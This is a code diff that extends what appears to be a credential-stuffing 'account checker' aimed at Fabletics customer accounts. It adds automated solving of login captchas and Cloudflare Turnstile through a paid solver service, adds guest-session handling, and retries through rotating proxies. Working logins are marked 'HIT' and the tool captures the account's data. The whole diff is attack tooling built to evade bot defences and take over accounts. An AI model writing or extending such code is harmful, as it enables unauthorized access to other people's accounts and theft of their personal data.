@@ -6,7 +6,7 @@ import time
 from dataclasses import dataclass, field
 from typing import Any
 
-from .captcha import captcha_api_key, needs_captcha, solve_recaptcha
+from .captcha import captcha_api_key, needs_captcha, solve_login_captcha, turnstile_site_key
 from .client import FableticsAPIError, FableticsClient
 from .config import CHECK_DELAY_MAX, CHECK_DELAY_MIN, DEFAULT_PROXY
 from .proxy import parse_proxy, with_rotating_session
@@ -217,13 +217,36 @@ def _classify_api_error(exc: FableticsAPIError, email: str, password: str) -> Ch
     return CheckResult(status="ERROR", email=email, password=password, message=message)
 
 
+def _prepare_login_captcha(
+    client: FableticsClient,
+    email: str,
+    timeout: int,
+) -> tuple[str, str | None]:
+    guest_token = client.create_guest_session()
+    captcha_token: str | None = None
+    if captcha_api_key():
+        methods = client.get_login_methods(email, guest_token)
+        if methods.get("captcha") or client.is_turnstile_enabled(guest_token):
+            captcha_token = solve_login_captcha(timeout=min(timeout * 2, 120))
+    return guest_token, captcha_token
+
+
 def _attempt_check(
     client: FableticsClient,
     email: str,
     password: str,
     recaptcha_response: str | None = None,
+    guest_token: str | None = None,
+    timeout: int = 30,
 ) -> CheckResult:
-    login = client.login(email, password, recaptcha_response=recaptcha_response)
+    if guest_token is None and recaptcha_response is None and captcha_api_key():
+        guest_token, recaptcha_response = _prepare_login_captcha(client, email, timeout)
+    login = client.login(
+        email,
+        password,
+        recaptcha_response=recaptcha_response,
+        guest_token=guest_token,
+    )
     data = capture_account_data(client, login.access_token, login.customer)
     return CheckResult(status="HIT", email=email, password=password, data=data)
 
@@ -242,8 +265,15 @@ def _solve_and_retry(
             password=password,
             message=f"{reason} — set CAPSOLVER_API_KEY",
         )
+    if not turnstile_site_key():
+        return CheckResult(
+            status="BAN",
+            email=email,
+            password=password,
+            message=f"{reason} — set TURNSTILE_SITE_KEY",
+        )
     try:
-        token = solve_recaptcha(timeout=min(timeout * 2, 120))
+        token = solve_login_captcha(timeout=min(timeout * 2, 120))
     except Exception as solve_exc:
         return CheckResult(
             status="BAN",
@@ -259,7 +289,15 @@ def _solve_and_retry(
             message=f"{reason} — solver returned empty token",
         )
     try:
-        return _attempt_check(client, email, password, recaptcha_response=token)
+        guest_token = client.create_guest_session()
+        return _attempt_check(
+            client,
+            email,
+            password,
+            recaptcha_response=token,
+            guest_token=guest_token,
+            timeout=timeout,
+        )
     except FableticsAPIError as retry_exc:
         return _classify_api_error(retry_exc, email, password)
 
@@ -278,7 +316,7 @@ def check_account(
     client = FableticsClient(proxy=resolved_proxy, timeout=timeout)
 
     try:
-        return _attempt_check(client, email, password)
+        return _attempt_check(client, email, password, timeout=timeout)
     except FableticsAPIError as exc:
         message = str(exc)
         if _is_gateway_block(exc, message) or exc.captcha_required or needs_captcha(message):
